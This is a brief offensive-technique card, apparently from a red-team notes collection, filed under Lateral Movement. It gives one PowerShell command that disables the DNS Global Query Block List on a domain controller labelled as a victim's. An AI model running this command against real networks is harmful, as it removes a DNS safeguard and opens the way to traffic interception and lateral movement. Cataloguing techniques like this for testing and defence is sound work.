# Disable Windows DNS Global Query Block List

OS: Windows
Description: Disable Windows DNS Global Query Block List
Security Domains: Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.victimdomain.local
```